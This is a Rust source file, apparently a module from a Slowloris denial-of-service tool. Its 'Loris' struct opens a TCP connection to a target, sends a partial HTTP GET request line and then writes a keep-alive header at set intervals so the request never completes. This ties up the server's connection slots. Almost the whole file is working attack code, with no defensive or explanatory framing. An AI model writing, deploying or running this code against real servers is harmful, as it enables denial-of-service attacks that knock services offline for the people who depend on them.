use std::{
    io::Write,
    net::{TcpStream, ToSocketAddrs},
    time::{Duration, Instant},
};

use log::{debug, warn};

#[derive(Debug)]
pub(crate) struct Loris {
    stream: TcpStream,
    interval: Duration,
    next_send: Instant,
}

impl Loris {
    pub(crate) fn spawn(target: &impl ToSocketAddrs, interval: Duration) -> Option<Loris> {
        debug!("spawning new loris");
        Loris::create_connection(target).and_then(|stream| {
            Some(Loris {
                stream,
                interval,
                next_send: Instant::now(),
            })
        })
    }

    pub(crate) fn tick(self: &mut Self, tick_time: Instant) -> bool {
        if self.next_send > tick_time {
            return true;
        }

        // todo: parameterize extension
        match self.stream.write_all(b"Connection: keep-alive;\r\n") {
            Ok(_) => {
                self.next_send = Instant::now() + self.interval;
                true
            }
            Err(err) => {
                warn!("failed to send another header to keep connection alive: {err}");
                false
            }
        }
    }

    pub(crate) fn get_next_tick_time(self: &Self) -> Instant {
        self.next_send
    }

    fn create_connection(addr: &impl ToSocketAddrs) -> Option<TcpStream> {
        let mut stream = match TcpStream::connect(addr) {
            Err(err) => {
                warn!("failed to connect to target address: {err}");
                None
            }
            Ok(stream) => {
                match stream
                    .set_nonblocking(true)
                    .and_then(|()| stream.set_nodelay(true))
                {
                    Ok(_) => Some(stream),
                    Err(err) => {
                        warn!("failed to set connection parameters: {err}");
                        None
                    }
                }
            }
        }?;

        // todo: parameterize preamble
        match stream.write_all(b"GET /favicon.ico HTTP/1.1\r\n") {
            Ok(_) => Some(stream),
            Err(err) => {
                warn!("failed to write preamble: {err}");
                None
            }
        }
    }
}
